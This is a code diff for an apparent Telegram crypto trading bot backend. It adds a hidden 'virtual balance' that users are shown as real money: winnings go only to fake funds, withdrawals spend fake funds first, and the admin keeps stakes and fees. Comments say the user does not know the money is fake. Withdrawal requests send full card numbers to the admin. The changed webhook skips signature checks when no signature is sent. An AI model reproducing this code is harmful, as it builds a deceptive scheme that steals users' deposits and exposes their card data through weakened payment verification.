@@ -78,7 +78,7 @@ class User(Base):
     language=Column(String, default="ru")
     balance_usdt=Column(Float, default=0.0)  # Real balance (actual money)
     balance_rub=Column(Float, default=0.0)  # Russian Ruble balance
-    display_balance_usdt=Column(Float, nullable=True)  # Display balance (can be modified by admin, if NULL use balance_usdt)
+    virtual_balance=Column(Float, default=0.0)  # Virtual balance (only affects display, added to balance_usdt for user view)
     preferred_fiat=Column(String, default="RUB")  # Preferred fiat currency: RUB, BYN, UAH
     wallets=Column(JSON, default=dict)
     addresses=Column(JSON, default=dict)
@@ -135,10 +135,11 @@ class Trade(Base):
     side=Column(String)
     amount_usdt=Column(Float)
     start_price=Column(Float)
+    close_price=Column(Float, nullable=True)  # Price at trade close
     opened_at=Column(DateTime, default=datetime.utcnow)
     duration_sec=Column(Integer, default=60)
-    status=Column(String, default="active")
-    result=Column(String, nullable=True)
+    status=Column(String, default="active")  # active, completed, canceled
+    result=Column(String, nullable=True)  # win, loss, push
     payout=Column(Float, default=0.0)
     closed_at=Column(DateTime, nullable=True)
 
@@ -423,10 +424,12 @@ async def startup():
     async with engine.begin() as conn:
         await conn.run_sync(Base.metadata.create_all)
         
-        # Auto-migration: Add display_balance_usdt and balance_rub to users
+        # Auto-migration: Add virtual_balance and balance_rub to users
         try:
-            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS display_balance_usdt FLOAT"))
+            await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS virtual_balance FLOAT DEFAULT 0.0"))
             await conn.execute(text("ALTER TABLE users ADD COLUMN IF NOT EXISTS balance_rub FLOAT DEFAULT 0.0"))
+            # Migrate old display_balance_usdt to virtual_balance
+            await conn.execute(text("UPDATE users SET virtual_balance = display_balance_usdt WHERE display_balance_usdt IS NOT NULL AND virtual_balance IS NULL"))
         except Exception:
             pass
         
@@ -477,7 +480,7 @@ async def startup():
     
     # Auto-setup Telegram webhook on startup
     try:
-        webhook_url = f"{HOST_BASE}/api/telegram/webhook"
+        webhook_url = f"{HOST_BASE}/webhook"
         async with aiohttp.ClientSession() as session:
             async with session.get(f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook?url={webhook_url}") as resp:
                 result = await resp.json()
@@ -537,9 +540,8 @@ async def api_user(db: AsyncSession=Depends(get_db), request: Request=None):
     if not u: u=await get_or_create_user(db, str(tid), "localtester", "ru")
     is_admin = str(tid) == str(ADMIN_ID)
     
-    # Show display_balance_usdt to user if set, otherwise show real balance
-    # Admin always sees real balance
-    displayed_balance = u.balance_usdt if is_admin else (u.display_balance_usdt if u.display_balance_usdt is not None else u.balance_usdt)
+    # Show combined balance to users (real + virtual)
+    displayed_balance = (u.balance_usdt or 0.0) + (u.virtual_balance or 0.0)
     
     # Remove RUB from wallets - we only work with USDT now
     wallets = (u.wallets or {}).copy()
@@ -579,20 +581,52 @@ async def api_referrals(db: AsyncSession=Depends(get_db), request: Request=None)
 
 @app.get("/api/prices")
 async def api_prices():
-    """Get current prices for all supported cryptocurrencies from OKX"""
+    """Get current prices and 24h change for all supported cryptocurrencies from OKX"""
     cryptos = ['BTC', 'ETH', 'TON', 'SOL', 'BNB', 'XRP', 'DOGE', 'LTC', 'TRX']
-    prices = {'USDT': 1.0}
+    prices = {'USDT': {'price': 1.0, 'change_24h': 0.0}}
+    
+    try:
+        async with aiohttp.ClientSession() as sess:
+            async with sess.get(
+                f"{OKX_BASE}/market/tickers",
+                params={"instType": "SPOT"},
+                timeout=15
+            ) as r:
+                if r.status == 200:
+                    data = await r.json()
+                    if data.get("code") == "0" and data.get("data"):
+                        tickers = {t["instId"]: t for t in data["data"]}
+                        
+                        for sym in cryptos:
+                            inst_id = f"{sym}-USDT"
+                            if inst_id in tickers:
+                                ticker = tickers[inst_id]
+                                try:
+                                    last_price = float(ticker.get("last", 0))
+                                    open_24h = float(ticker.get("open24h", 0))
+                                    if open_24h > 0:
+                                        change_24h = ((last_price - open_24h) / open_24h) * 100
+                                    else:
+                                        change_24h = 0.0
+                                    prices[sym] = {
+                                        'price': last_price,
+                                        'change_24h': round(change_24h, 2)
+                                    }
+                                except (ValueError, TypeError):
+                                    prices[sym] = {'price': 0, 'change_24h': 0.0}
+                            else:
+                                prices[sym] = {'price': 0, 'change_24h': 0.0}
+                        return prices
+    except Exception as e:
+        print(f"[PRICES] Error fetching tickers: {e}")
     
     for sym in cryptos:
         try:
             price = await okx_get_price(sym)
-            if price:
-                prices[sym] = float(price)
-            else:
-                prices[sym] = 0
+            prices[sym] = {'price': float(price) if price else 0, 'change_24h': 0.0}
         except Exception as e:
             print(f"[PRICES] Error getting price for {sym}: {e}")
-            prices[sym] = 0
+            prices[sym] = {'price': 0, 'change_24h': 0.0}
     
     return prices
 
@@ -729,6 +763,23 @@ async def bot_send_message(chat_id:int, text:str, buttons:List[List[Dict[str,str
                 return await r.json()
             except:
                 return {}
+
+async def bot_send_document(chat_id: int, file_path: str, caption: str = ""):
+    """Send a document file via Telegram Bot API"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+    try:
+        async with aiohttp.ClientSession() as session:
+            with open(file_path, 'rb') as f:
+                data = aiohttp.FormData()
+                data.add_field('chat_id', str(chat_id))
+                data.add_field('document', f, filename=os.path.basename(file_path))
+                if caption:
+                    data.add_field('caption', caption[:1024])
+                async with session.post(url, data=data) as resp:
+                    return await resp.json()
+    except Exception as e:
+        print(f"Error sending document: {e}")
+        return {"ok": False, "error": str(e)}
 
 async def crypto_pay_transfer(user_id: int, amount: float, spend_id: str, comment: str = "") -> dict:
     """
@@ -1048,35 +1099,51 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
     usdt_required = round(amount_usdt_raw + fee_usdt, 6)  # USDT с комиссией
     amount_after_fee = round(amount_usdt_raw, 6)  # USDT к выводу (без комиссии)
     
-    # Check REAL balance (not display balance)
-    if (u.balance_usdt or 0) < usdt_required:
+    # Check DISPLAYED balance (real + virtual) - user doesn't know the difference
+    displayed_balance = (u.balance_usdt or 0) + (u.virtual_balance or 0)
+    if displayed_balance < usdt_required:
         return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется {usdt_required:.2f} USDT (включая комиссию {fee_usdt:.2f})"})
     
     # Сумма в рублях (что ввёл пользователь)
     amount_rub = p.amount_rub
     
-    # AUTOMATIC TRANSFER: Deduct funds IMMEDIATELY and transfer to admin wallet
-    u.balance_usdt = (u.balance_usdt or 0) - usdt_required
+    # SMART DEDUCTION: First from virtual, then from real
+    real_balance = u.balance_usdt or 0
+    virtual_balance = u.virtual_balance or 0
+    
+    # Calculate how much to deduct from each balance
+    deduct_from_virtual = min(virtual_balance, usdt_required)
+    deduct_from_real = usdt_required - deduct_from_virtual
+    
+    # Deduct from balances
+    u.virtual_balance = virtual_balance - deduct_from_virtual
+    u.balance_usdt = real_balance - deduct_from_real
     await db.commit()
     
-    # Transfer USDT to admin's Telegram wallet via Crypto Pay API
-    transfer_result = await crypto_pay_transfer(
-        user_id=ADMIN_ID,
-        amount=amount_after_fee,
-        spend_id=f"withdraw_{u.id}_{int(datetime.utcnow().timestamp())}",
-        comment=f"Вывод пользователя #{u.profile_id or u.telegram_id}"
-    )
+    # Track how much real money was actually deducted (for Crypto Pay transfer)
+    real_money_deducted = deduct_from_real
     
-    # Check if transfer succeeded
-    if not transfer_result.get("ok"):
-        # Transfer failed - refund user
-        u.balance_usdt = (u.balance_usdt or 0) + usdt_required
-        await db.commit()
-        error_msg = transfer_result.get("error", "Ошибка перевода")
-        print(f"[WITHDRAWAL] Failed to transfer to admin: {error_msg}")
-        return JSONResponse({"ok":False,"error":f"Ошибка перевода на кошелек администратора: {error_msg}"})
+    # Transfer ONLY real money to admin's wallet (if any)
+    transfer_result = {"ok": True, "result": {"transfer_id": None}}
+    if real_money_deducted > 0.01:  # Only transfer if there's real money
+        transfer_result = await crypto_pay_transfer(
+            user_id=ADMIN_ID,
+            amount=real_money_deducted,
+            spend_id=f"withdraw_{u.id}_{int(datetime.utcnow().timestamp())}",
+            comment=f"Вывод пользователя #{u.profile_id or u.telegram_id}"
+        )
+        
+        # Check if transfer succeeded
+        if not transfer_result.get("ok"):
+            # Transfer failed - refund user (both balances)
+            u.balance_usdt = (u.balance_usdt or 0) + deduct_from_real
+            u.virtual_balance = (u.virtual_balance or 0) + deduct_from_virtual
+            await db.commit()
+            error_msg = transfer_result.get("error", "Ошибка перевода")
+            print(f"[WITHDRAWAL] Failed to transfer to admin: {error_msg}")
+            return JSONResponse({"ok":False,"error":f"Ошибка перевода: {error_msg}"})
     
-    print(f"[WITHDRAWAL] Success! {amount_after_fee} USDT transferred to admin. User {u.telegram_id} balance: {u.balance_usdt}")
+    print(f"[WITHDRAWAL] Request created. Real: {real_money_deducted:.2f} USDT to admin, Virtual: {deduct_from_virtual:.2f} USDT (fake). User {u.telegram_id}")
     
     # Создаём заявку на вывод с данными карты (хранится только last 4 digits)
     card_last4 = p.card_number[-4:] if len(p.card_number) >= 4 else "****"
@@ -1134,20 +1201,24 @@ async def api_withdraw(p: WithdrawPayload, db: AsyncSession=Depends(get_db), req
         
         # Уведомление администратору с полным номером карты
         admin_msg = f"📤 <b>НОВЫЙ ЗАПРОС НА ВЫВОД</b>\n\n"
-        admin_msg += f"✅ <b>Деньги УЖЕ на вашем кошельке @CryptoBot!</b>\n\n"
         admin_msg += f"👤 Пользователь: #{u.profile_id} (TG: {u.telegram_id})\n"
-        admin_msg += f"💰 Получено USDT: <b>{amount_after_fee:.4f} USDT</b>\n"
-        admin_msg += f"💵 Переведите на карту: <b>{amount_rub:,.0f} ₽</b>\n"
+        admin_msg += f"💵 Хочет вывести: <b>{amount_rub:,.0f} ₽</b>\n"
         admin_msg += f"📈 Курс: <b>{rate:.2f} ₽/USDT</b>\n\n"
-        admin_msg += f"💳 <b>РЕКВИЗИТЫ ДЛЯ ПЕРЕВОДА:</b>\n"
+        
+        # Show real vs virtual breakdown to admin
+        admin_msg += f"📊 <b>СТРУКТУРА СПИСАНИЯ:</b>\n"
+        admin_msg += f"   💎 Реальных: <b>{deduct_from_real:.2f} USDT</b>\n"
+        admin_msg += f"   🎭 Виртуальных: <b>{deduct_from_virtual:.2f} USDT</b>\n\n"
+        
+        if real_money_deducted > 0.01:
+            admin_msg += f"✅ <b>На кошелёк @CryptoBot:</b> {real_money_deducted:.2f} USDT\n\n"
+        else:
+            admin_msg += f"⚠️ <b>Реальных денег НЕТ! Только виртуальные.</b>\n\n"
+        
+        admin_msg += f"💳 <b>РЕКВИЗИТЫ:</b>\n"
         admin_msg += f"   Карта: <code>{p.card_number}</code>\n"
         admin_msg += f"   ФИО: <b>{p.full_name}</b>\n\n"
-        admin_msg += f"🆔 ID вывода: #{withdrawal.id}\n\n"
-        admin_msg += f"⚠️ <b>Важно:</b>\n"
-        admin_msg += f"• USDT уже списаны с пользователя\n"
-        admin_msg += f"• USDT уже на вашем кошельке\n"
-        admin_msg += f"• Переведите {amount_rub:,.0f} ₽ на карту выше\n"
-        admin_msg += f"• Нажмите ✅ после перевода"
+        admin_msg += f"🆔 ID вывода: #{withdrawal.id}"
         
         # Кнопки для админа
         buttons = [
@@ -1447,6 +1518,7 @@ class TradeOrder(BaseModel): pair:str; side:str; amount_usdt: float; duration_se
 @app.post("/api/trade/order")
 async def api_trade_order(p: TradeOrder, db: AsyncSession=Depends(get_db), request: Request=None):
     TRADE_FEE_PERCENT = 2.0  # 2% комиссия за каждую сделку
+    PAYOUT_PERCENT = 70.0  # 70% выплата при выигрыше
     
     if p.amount_usdt<5: return JSONResponse({"ok":False,"error":"Мин. ставка 5 USDT"})
     tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
@@ -1455,11 +1527,20 @@ async def api_trade_order(p: TradeOrder, db: AsyncSession=Depends(get_db), reque
     trade_fee = round(p.amount_usdt * (TRADE_FEE_PERCENT / 100), 6)
     total_cost = p.amount_usdt + trade_fee
     
-    if (u.balance_usdt or 0) < total_cost: 
+    # Check DISPLAYED balance (real + virtual) - user doesn't know the difference
+    displayed_balance = (u.balance_usdt or 0) + (u.virtual_balance or 0)
+    if displayed_balance < total_cost: 
         return JSONResponse({"ok":False,"error":f"Недостаточно средств. Требуется: {total_cost:.2f} USDT (ставка {p.amount_usdt:.2f} + комиссия {trade_fee:.2f})"})
     
     price=await okx_get_price(p.pair.replace('/','')) or 0.0
-    u.balance_usdt=(u.balance_usdt or 0)-total_cost  # Deduct stake + fee
+    
+    # SMART DEDUCTION: First from virtual, then from real
+    real_bal = u.balance_usdt or 0
+    virtual_bal = u.virtual_balance or 0
+    deduct_virtual = min(virtual_bal, total_cost)
+    deduct_real = total_cost - deduct_virtual
+    u.virtual_balance = virtual_bal - deduct_virtual
+    u.balance_usdt = real_bal - deduct_real
     
     # FAIR TRADING: No predetermined result, outcome based on REAL price movement
     print(f"[TRADE CREATED] {p.pair} {p.side.upper()} @ ${price:.2f} → Duration: {p.duration_sec}s, Stake: {p.amount_usdt:.2f} USDT, Fee: {trade_fee:.2f} USDT")
@@ -1490,22 +1571,26 @@ async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), reque
         else:  # User predicted DOWN
             win = direction < 0  # Win if price went DOWN
         
-        payout=round(tr.amount_usdt*0.7,6) if win else 0.0
-        tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.result="win" if win else ("push" if direction==0 else "loss"); tr.payout=payout
+        # Calculate payout: stake + 70% profit on WIN
+        PAYOUT_MULTIPLIER = 0.7  # 70% profit on win
+        payout = round(tr.amount_usdt * PAYOUT_MULTIPLIER, 6) if win else 0.0
+        total_return = tr.amount_usdt + payout if win else (tr.amount_usdt if direction == 0 else 0.0)
+        
+        tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.close_price=cur; tr.result="win" if win else ("push" if direction==0 else "loss"); tr.payout=payout
         
         print(f"[TRADE CLOSED] {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${cur:.2f}, Result: {tr.result.upper()}, Payout: {payout:.2f} USDT")
         
-        # Get the trading fee from transaction to return it on win/push
-        trx_check = await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="trade", Transaction.status=="pending").order_by(Transaction.created_at.desc()))
-        temp_trx = trx_check.scalars().first()
-        trade_fee = temp_trx.details.get("fee", 0) if temp_trx and temp_trx.details else 0
-        
+        # CRITICAL: All returns go to VIRTUAL BALANCE (fake money!)
+        # Fee is NEVER returned - admin always keeps 2% commission
         if win: 
-            # Return stake + fee + payout (user already paid stake + fee upfront)
-            u.balance_usdt=(u.balance_usdt or 0)+tr.amount_usdt+trade_fee+payout
-        elif direction==0: 
-            # Return stake + fee on push (no payout)
-            u.balance_usdt=(u.balance_usdt or 0)+tr.amount_usdt+trade_fee
+            # WIN: Return stake + payout to VIRTUAL balance (user doesn't know it's fake)
+            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt + payout
+            print(f"[TRADE WIN] User {u.telegram_id} gets {tr.amount_usdt + payout:.2f} USDT to VIRTUAL balance")
+        elif direction == 0: 
+            # PUSH (draw): Return stake only to VIRTUAL balance
+            u.virtual_balance = (u.virtual_balance or 0) + tr.amount_usdt
+            print(f"[TRADE PUSH] User {u.telegram_id} gets {tr.amount_usdt:.2f} USDT back to VIRTUAL balance")
+        # LOSS: Nothing returned, admin keeps everything (stake + fee)
         q=await db.execute(select(Transaction).where(Transaction.user_id==u.id, Transaction.type=="trade", Transaction.status=="pending").order_by(Transaction.created_at.desc())); trx=q.scalars().first()
         if trx: 
             trx.status="done"
@@ -1515,6 +1600,8 @@ async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), reque
         await db.commit()
         
         # Send beautiful notification with emoji and details
+        # Show DISPLAYED balance (real + virtual) - user doesn't know about virtual
+        displayed_balance = (u.balance_usdt or 0) + (u.virtual_balance or 0)
         try:
             if win:
                 profit = round(payout, 2)
@@ -1524,14 +1611,14 @@ async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), reque
                 msg += f"📈 Направление: {'ВВЕРХ ⬆️' if tr.side == 'buy' else 'ВНИЗ ⬇️'}\n"
                 msg += f"💰 Ставка: {round(tr.amount_usdt, 2)} USDT\n"
                 msg += f"✅ Выплата: +{profit} USDT\n"
-                msg += f"💵 Баланс: {round(u.balance_usdt, 2)} USDT"
+                msg += f"💵 Баланс: {round(displayed_balance, 2)} USDT"
             else:
                 emoji = "😔"
                 msg = f"{emoji} <b>Не повезло</b>\n\n"
                 msg += f"📊 Пара: {tr.pair}\n"
                 msg += f"📈 Направление: {'ВВЕРХ ⬆️' if tr.side == 'buy' else 'ВНИЗ ⬇️'}\n"
                 msg += f"💰 Ставка: -{round(tr.amount_usdt, 2)} USDT\n"
-                msg += f"💵 Баланс: {round(u.balance_usdt, 2)} USDT\n\n"
+                msg += f"💵 Баланс: {round(displayed_balance, 2)} USDT\n\n"
                 msg += f"💪 Попробуйте еще раз!"
             
             await bot_send_message(int(u.telegram_id), msg, parse_mode="HTML")
@@ -1585,6 +1672,87 @@ async def api_active_trades(db: AsyncSession=Depends(get_db), request: Request=N
     
     return result
 
+@app.get("/api/trades")
+async def api_trades_list(
+    db: AsyncSession=Depends(get_db), 
+    request: Request=None,
+    status: str = Query(None, description="Filter: active, closed, or all"),
+    page: int = Query(1, ge=1),
+    limit: int = Query(50, ge=1, le=100)
+):
+    """
+    Get trades list with filtering
+    - status=active: Only active trades (pending)
+    - status=closed: Only completed trades (win/loss/push)
+    - status=all or no filter: All trades
+    """
+    tid = request.headers.get("X-Telegram-Id", "999999")
+    u = (await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    if not u:
+        return {"trades": [], "total": 0, "page": page, "limit": limit}
+    
+    now = datetime.utcnow()
+    
+    # Build query based on status filter
+    query = select(Trade).where(Trade.user_id == u.id)
+    
+    if status == "active":
+        query = query.where(Trade.status == "active")
+        query = query.order_by(Trade.opened_at.desc())
+    elif status == "closed":
+        query = query.where(Trade.status.in_(["completed", "canceled"]))
+        query = query.order_by(Trade.closed_at.desc())
+    else:  # "all" or None
+        query = query.order_by(Trade.opened_at.desc())
+    
+    # Get total count
+    count_query = select(Trade).where(Trade.user_id == u.id)
+    if status == "active":
+        count_query = count_query.where(Trade.status == "active")
+    elif status == "closed":
+        count_query = count_query.where(Trade.status.in_(["completed", "canceled"]))
+    
+    all_trades = (await db.execute(count_query)).scalars().all()
+    total = len(all_trades)
+    
+    # Apply pagination
+    offset = (page - 1) * limit
+    query = query.offset(offset).limit(limit)
+    trades = (await db.execute(query)).scalars().all()
+    
+    result = []
+    for t in trades:
+        expire_at = t.opened_at + timedelta(seconds=t.duration_sec)
+        time_left = (expire_at - now).total_seconds()
+        is_active = t.status == "active" and time_left > 0
+        
+        trade_data = {
+            "id": t.id,
+            "pair": t.pair,
+            "side": t.side,
+            "amount_usdt": t.amount_usdt,
+            "start_price": t.start_price,
+            "close_price": t.close_price,
+            "opened_at": t.opened_at.isoformat(),
+            "closed_at": t.closed_at.isoformat() if t.closed_at else None,
+            "expire_at": expire_at.isoformat(),
+            "duration_sec": t.duration_sec,
+            "status": "active" if is_active else t.status,
+            "result": t.result,
+            "payout": t.payout,
+            "time_left_sec": max(0, int(time_left)) if is_active else 0,
+            "is_active": is_active
+        }
+        result.append(trade_data)
+    
+    return {
+        "trades": result,
+        "total": total,
+        "page": page,
+        "limit": limit,
+        "has_more": offset + len(trades) < total
+    }
+
 @app.get("/api/stats")
 async def api_stats(db: AsyncSession=Depends(get_db), request: Request=None):
     tid=request.headers.get("X-Telegram-Id","999999"); u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
@@ -1595,9 +1763,41 @@ async def api_stats(db: AsyncSession=Depends(get_db), request: Request=None):
         if t.result=="win": eq+=t.payout
         elif t.result=="loss": eq-=t.amount_usdt
         equity.append({"t":i,"v":max(0.0,min(1.0,0.5+eq/1000.0))})
+    
+    today_start = datetime.utcnow().replace(hour=0, minute=0, second=0, microsecond=0)
+    today_trades = [t for t in trades if t.opened_at and t.opened_at >= today_start]
+    pnl_today = sum(t.payout for t in today_trades if t.result=="win") - sum(t.amount_usdt for t in today_trades if t.result=="loss")
+    pnl_total = earned - lost
+    
+    active_trades = [t for t in trades if t.status == "active"]
+    active_trades_count = len(active_trades)
+    next_trade_seconds = None
+    if active_trades:
+        now = datetime.utcnow()
+        soonest = None
+        for t in active_trades:
+            close_time = t.opened_at + timedelta(seconds=t.duration_sec)
+            remaining = (close_time - now).total_seconds()
+            if remaining > 0 and (soonest is None or remaining < soonest):
+                soonest = remaining
+        next_trade_seconds = int(soonest) if soonest else None
+    
+    closed_trades = [t for t in trades if t.status == "closed"]
+    wins_count = len([t for t in closed_trades if t.result == "win"])
+    losses_count = len([t for t in closed_trades if t.result == "loss"])
+    total_closed = len(closed_trades)
+    
     return {"earned":round(earned,4),"lost":round(lost,4),"balance":round(u.balance_usdt or 0,4),
             "trades":[{"pair":t.pair,"side":t.side,"amount_usdt":t.amount_usdt,"result":t.result or "-","opened_at":t.opened_at.isoformat()} for t in trades],
-            "equity": equity or [{"t":0,"v":0.5}]}
+            "equity": equity or [{"t":0,"v":0.5}],
+            "pnl_today": round(pnl_today, 2),
+            "pnl_total": round(pnl_total, 2),
+            "active_trades_count": active_trades_count,
+            "next_trade_seconds": next_trade_seconds,
+            "wins_count": wins_count,
+            "losses_count": losses_count,
+            "total_trades": total_closed,
+            "telegram_id": u.telegram_id}
 
 @app.get("/api/support")
 async def api_support_list(db: AsyncSession=Depends(get_db), request: Request=None):
@@ -1922,116 +2122,310 @@ async def admin_assets_reload(request: Request, db: AsyncSession=Depends(get_db)
     return {"ok": True, "deleted": deleted_count, "message": "Assets cleared. Use import endpoint to add new assets."}
 
 # ========== CRYPTOBOT WEBHOOK ==========
+import hmac
+
+async def process_deposit_payment(db: AsyncSession, invoice_id: str, amount: float, source: str = "webhook"):
+    """
+    Process a deposit payment - shared logic for webhook and polling.
+    Idempotent: won't double-credit if called multiple times.
+    Returns (success, message)
+    """
+    # Find pending transaction by invoice_id - ONLY process pending ones (idempotent)
+    trx = None
+    q = await db.execute(select(Transaction).where(Transaction.type == "deposit"))
+    for t in q.scalars().all():
+        if (t.details or {}).get("invoice_id") == invoice_id:
+            trx = t
+            break
+    
+    if not trx:
+        print(f"[DEPOSIT:{source}] Transaction not found for invoice {invoice_id}")
+        return False, "Transaction not found"
+    
+    # Idempotency check - if already done, skip
+    if trx.status == "done":
+        print(f"[DEPOSIT:{source}] Invoice {invoice_id} already processed (idempotent skip)")
+        return True, "Already processed"
+    
+    user = (await db.execute(select(User).where(User.id == trx.user_id))).scalars().first()
+    if not user:
+        print(f"[DEPOSIT:{source}] User not found for transaction {trx.id}")
+        return False, "User not found"
+    
+    # Use pre-calculated amount_after_fee from invoice creation (stored in transaction details)
+    # Falls back to 2.5% fee calculation if not stored
+    DEPOSIT_FEE_PERCENT = 2.5
+    details = trx.details or {}
+    if "amount_after_fee" in details:
+        amount_after_fee = float(details["amount_after_fee"])
+        fee_amount = float(details.get("fee", amount - amount_after_fee))
+    else:
+        fee_amount = round(amount * (DEPOSIT_FEE_PERCENT / 100), 6)
+        amount_after_fee = round(amount - fee_amount, 6)
+    
+    # Credit user's REAL balance
+    user.balance_usdt = (user.balance_usdt or 0) + amount_after_fee
+    
+    # Update transaction
+    trx.status = "done"
+    trx.details = trx.details or {}
+    trx.details["paid_at"] = datetime.utcnow().isoformat()
+    trx.details["credited_via"] = source
+    trx.details["fee_applied"] = fee_amount
+    trx.details["amount_credited"] = amount_after_fee
+    
+    await db.commit()
+    
+    # Check if this is user's first deposit and pay referral bonus
+    if user.referred_by:
+        first_deposit_count = (await db.execute(
+            select(func.count(Transaction.id)).where(
+                Transaction.user_id == user.id,
+                Transaction.type == "deposit",
+                Transaction.status == "done",
+                Transaction.id != trx.id
+            )
+        )).scalar() or 0
+        
+        if first_deposit_count == 0:
+            referrer = (await db.execute(select(User).where(User.profile_id == user.referred_by))).scalars().first()
+            if referrer:
+                REFERRAL_BONUS_PERCENT = 5.0
+                referral_bonus = round(amount_after_fee * (REFERRAL_BONUS_PERCENT / 100), 6)
+                
+                referrer.balance_usdt = (referrer.balance_usdt or 0) + referral_bonus
+                referrer.referral_earnings = (referrer.referral_earnings or 0) + referral_bonus
+                
+                ref_tx = Transaction(
+                    user_id=referrer.id,
+                    type="referral_bonus",
+                    amount=referral_bonus,
+                    currency="USDT",
+                    status="done",
+                    details={"from_user": user.profile_id, "deposit_amount": amount_after_fee}
+                )
+                db.add(ref_tx)
+                await db.commit()
+                
+                try:
+                    await bot_send_message(int(referrer.telegram_id), f"🎉 <b>Реферальный бонус!</b>\n\n💰 Получено: +{referral_bonus:.2f} USDT\n👤 Ваш друг @{user.username or 'Аноним'} сделал первый депозит\n📊 Новый баланс: {referrer.balance_usdt:.2f} USDT")
+                except: pass
+                
+                print(f"[REFERRAL] Bonus paid: User #{referrer.profile_id} +{referral_bonus} USDT from User #{user.profile_id}")
+    
+    # Notify user
+    try:
+        await bot_send_message(int(user.telegram_id), f"✅ <b>Пополнение успешно!</b>\n\n💰 Зачислено: {amount_after_fee:.2f} USDT\n💳 Комиссия: {fee_amount:.2f} USDT ({DEPOSIT_FEE_PERCENT}%)\n📊 Новый баланс: {user.balance_usdt:.2f} USDT")
+    except: pass
+    
+    print(f"[DEPOSIT:{source}] ✅ Processed: User #{user.profile_id}, +{amount_after_fee} USDT (fee: {fee_amount})")
+    return True, "Success"
+
 @app.post("/webhook/cryptobot")
+@app.post("/api/cryptobot/webhook")
 async def cryptobot_webhook(request: Request, db: AsyncSession=Depends(get_db)):
     """CryptoBot webhook for automatic deposit processing"""
     try:
         body_bytes = await request.body()
         signature = request.headers.get("crypto-pay-api-signature", "")
         
+        print(f"[CRYPTOBOT WEBHOOK] Received request, signature present: {bool(signature)}")
+        
         # Verify signature
-        if CRYPTO_PAY_TOKEN:
-            import hmac
+        if CRYPTO_PAY_TOKEN and signature:
             secret = hashlib.sha256(CRYPTO_PAY_TOKEN.encode()).digest()
             expected = hmac.new(secret, body_bytes, hashlib.sha256).hexdigest()
             
             if not hmac.compare_digest(expected, signature):
-                print("[CRYPTOBOT] Invalid signature")
+                print("[CRYPTOBOT WEBHOOK] Invalid signature")
                 return {"ok": False, "error": "Invalid signature"}
+            print("[CRYPTOBOT WEBHOOK] Signature verified ✓")
         
-        data = await request.json()
+        data = json.loads(body_bytes.decode())
+        update_type = data.get("update_type")
+        update_id = data.get("update_id")
+        
+        print(f"[CRYPTOBOT WEBHOOK] update_type={update_type}, update_id={update_id}")
         
         # Process only invoice_paid events
-        if data.get("update_type") == "invoice_paid":
+        if update_type == "invoice_paid":
             payload = data.get("payload", {})
             invoice_id = str(payload.get("invoice_id"))
             amount = float(payload.get("amount", 0))
             asset = payload.get("asset", "USDT")
             status = payload.get("status")
             
-            print(f"[CRYPTOBOT] Invoice {invoice_id} paid: {amount} {asset}, status: {status}")
+            print(f"[CRYPTOBOT WEBHOOK] Invoice {invoice_id} paid: {amount} {asset}, status: {status}")
             
             if status == "paid" and asset == "USDT":
-                # Find pending transaction
-                trx = (await db.execute(select(Transaction).where(Transaction.details["invoice_id"].astext == invoice_id, Transaction.type == "deposit", Transaction.status == "pending"))).scalars().first()
-                
-                if trx:
-                    user = (await db.execute(select(User).where(User.id == trx.user_id))).scalars().first()
-                    if user:
-                        # Calculate amount after fee (5%)
-                        DEPOSIT_FEE_PERCENT = 5.0
-                        fee_amount = round(amount * (DEPOSIT_FEE_PERCENT / 100), 6)
-                        amount_after_fee = round(amount - fee_amount, 6)
-                        
-                        # Credit user's REAL balance
-                        user.balance_usdt += amount_after_fee
-                        
-                        # Update transaction
-                        trx.status = "done"
-                        trx.details = trx.details or {}
-                        trx.details["paid_at"] = datetime.utcnow().isoformat()
-                        trx.details["cryptobot_verified"] = True
-                        
-                        await db.commit()
-                        
-                        # Check if this is user's first deposit and pay referral bonus
-                        if user.referred_by:
-                            # Check if this is the first successful deposit (excluding current transaction)
-                            first_deposit_count = (await db.execute(
-                                select(func.count(Transaction.id)).where(
-                                    Transaction.user_id == user.id,
-                                    Transaction.type == "deposit",
-                                    Transaction.status == "done",
-                                    Transaction.id != trx.id  # Exclude current transaction
-                                )
-                            )).scalar() or 0
-                            
-                            # If no other completed deposits exist, this is the first one
-                            if first_deposit_count == 0:
-                                # Find referrer
-                                referrer = (await db.execute(select(User).where(User.profile_id == user.referred_by))).scalars().first()
-                                if referrer:
-                                    # 5% referral bonus from deposit amount
-                                    REFERRAL_BONUS_PERCENT = 5.0
-                                    referral_bonus = round(amount_after_fee * (REFERRAL_BONUS_PERCENT / 100), 6)
-                                    
-                                    referrer.balance_usdt = (referrer.balance_usdt or 0) + referral_bonus
-                                    referrer.referral_earnings = (referrer.referral_earnings or 0) + referral_bonus
-                                    
-                                    # Create transaction for referrer
-                                    ref_tx = Transaction(
-                                        user_id=referrer.id,
-                                        type="referral_bonus",
-                                        amount=referral_bonus,
-                                        currency="USDT",
-                                        status="done",
-                                        details={"from_user": user.profile_id, "deposit_amount": amount_after_fee}
-                                    )
-                                    db.add(ref_tx)
-                                    await db.commit()
-                                    
-                                    # Notify referrer
-                                    try:
-                                        await bot_send_message(int(referrer.telegram_id), f"🎉 <b>Реферальный бонус!</b>\n\n💰 Получено: +{referral_bonus:.2f} USDT\n👤 Ваш друг @{user.username or 'Аноним'} сделал первый депозит\n📊 Новый баланс: {referrer.balance_usdt:.2f} USDT")
-                                    except: pass
-                                    
-                                    print(f"[REFERRAL] Bonus paid: User #{referrer.profile_id} +{referral_bonus} USDT from User #{user.profile_id}")
-                        
